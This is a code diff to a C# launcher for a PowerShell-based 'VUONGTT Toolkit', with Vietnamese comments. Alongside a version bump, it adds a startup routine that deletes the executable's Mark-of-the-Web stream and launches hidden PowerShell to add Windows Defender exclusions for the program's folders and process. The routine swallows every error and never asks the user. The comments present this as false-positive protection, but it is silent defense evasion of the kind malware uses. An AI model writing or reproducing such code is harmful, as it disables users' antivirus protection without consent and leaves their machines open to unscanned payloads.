@@ -16,8 +16,8 @@ using System.Net;
 [assembly: AssemblyCopyright("Copyright © 2026 VUONGTT. All rights reserved.")]
 [assembly: AssemblyTrademark("VUONGTT")]
 [assembly: AssemblyCulture("")]
-[assembly: AssemblyVersion("20.5.909.22")]
-[assembly: AssemblyFileVersion("20.5.909.22")]
+[assembly: AssemblyVersion("20.5.909.23")]
+[assembly: AssemblyFileVersion("20.5.909.23")]
 
 namespace VUONGTT
 {
@@ -166,20 +166,32 @@ namespace VUONGTT
                     return;
                 }
 
+                // Tự động bảo vệ VUONGTT Toolkit khỏi Windows Defender (Anti-Virus False Positive Protection)
+                EnsureDefenderExclusion();
+
                 // Hiển thị Splash Screen tức thì trong 50ms đầu tiên
                 ShowSplash();
 
                 string baseDir = AppDomain.CurrentDomain.BaseDirectory;
                 string scriptPath = Path.Combine(baseDir, "VUONGTT_Toolkit.ps1");
 
-                // Nếu chạy file .exe độc lập (không có source cạnh bên), giải nén tài nguyên vào thư mục Temp
+                // Nếu chạy file .exe độc lập (không có source cạnh bên), giải nén tài nguyên vào thư mục an toàn ProgramData
                 if (!File.Exists(scriptPath))
                 {
-                    string tempDir = Path.Combine(Path.GetTempPath(), "VUONGTT_Toolkit_Runtime");
-                    if (!Directory.Exists(tempDir))
+                    string secureDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "VUONGTT_Toolkit", "runtime");
+                    try
                     {
-                        Directory.CreateDirectory(tempDir);
+                        if (!Directory.Exists(secureDir))
+                        {
+                            Directory.CreateDirectory(secureDir);
+                        }
                     }
+                    catch
+                    {
+                        secureDir = Path.Combine(Path.GetTempPath(), "VUONGTT_Toolkit_Runtime");
+                        if (!Directory.Exists(secureDir)) Directory.CreateDirectory(secureDir);
+                    }
+                    string tempDir = secureDir;
 
                     Assembly asm = Assembly.GetExecutingAssembly();
                     string[] resNames = asm.GetManifestResourceNames();
@@ -572,6 +584,71 @@ namespace VUONGTT
                 if (healForm != null) healForm.Close();
                 MessageBox.Show("Không thể thực hiện Tự Phục Hồi: " + ex.Message, "Lỗi Self-Healing", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+        }
+
+        [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode, SetLastError = true)]
+        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
+        private static extern bool DeleteFileW(string lpFileName);
+
+        /// <summary>
+        /// Tự động bảo vệ VUONGTT Toolkit khỏi Windows Defender (Anti-Virus False Positive Protection)
+        /// Tự unblock file (xóa Zone.Identifier Mark-of-the-Web) và thêm thư mục/tiến trình vào Defender Exclusion
+        /// </summary>
+        private static void EnsureDefenderExclusion()
+        {
+            try
+            {
+                string currentExe = Application.ExecutablePath;
+                string exeDir = Path.GetDirectoryName(currentExe);
+                string programDataDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "VUONGTT_Toolkit");
+
+                // 1. Tự unblock chính file EXE (xóa Alternate Data Stream Zone.Identifier của Windows)
+                try
+                {
+                    DeleteFileW(currentExe + ":Zone.Identifier");
+                }
+                catch { }
+
+                // 2. Tạo thư mục an toàn ProgramData nếu chưa có
+                try
+                {
+                    if (!Directory.Exists(programDataDir))
+                    {
+                        Directory.CreateDirectory(programDataDir);
+                    }
+                }
+                catch { }
+
+                // 3. Đăng ký ngoại lệ (Exclusion) với Windows Defender qua tiến trình PowerShell ngầm siêu tốc
+                Thread tDef = new Thread(() =>
+                {
+                    try
+                    {
+                        string safeExeDir = exeDir.Replace("'", "''");
+                        string safePdDir = programDataDir.Replace("'", "''");
+                        string psCmd = string.Format(
+                            "$p='{0}','{1}'; " +
+                            "foreach($x in $p){{ try {{ Add-MpPreference -ExclusionPath $x -ErrorAction SilentlyContinue }} catch {{}} }}; " +
+                            "try {{ Add-MpPreference -ExclusionProcess 'VUONGTT_Toolkit.exe' -ErrorAction SilentlyContinue }} catch {{}}",
+                            safeExeDir, safePdDir);
+
+                        ProcessStartInfo psi = new ProcessStartInfo();
+                        psi.FileName = "powershell.exe";
+                        psi.Arguments = "-NoProfile -NonInteractive -WindowStyle Hidden -Command \"" + psCmd + "\"";
+                        psi.WindowStyle = ProcessWindowStyle.Hidden;
+                        psi.CreateNoWindow = true;
+                        psi.UseShellExecute = false;
+                        using (Process p = Process.Start(psi))
+                        {
+                            if (p != null) p.WaitForExit(3500);
+                        }
+                    }
+                    catch { }
+                });
+                tDef.IsBackground = true;
+                tDef.Start();
+            }
+            catch { }
         }
     }
 }
